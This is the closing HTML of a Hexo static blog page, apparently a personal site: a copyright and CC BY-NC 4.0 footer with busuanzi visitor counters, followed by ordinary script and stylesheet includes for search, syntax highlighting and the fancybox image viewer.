- 2020 <a href="/." rel="nofollow">Nop</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/plugins/prettify/prettify.js"></script><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
    search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"></body></html>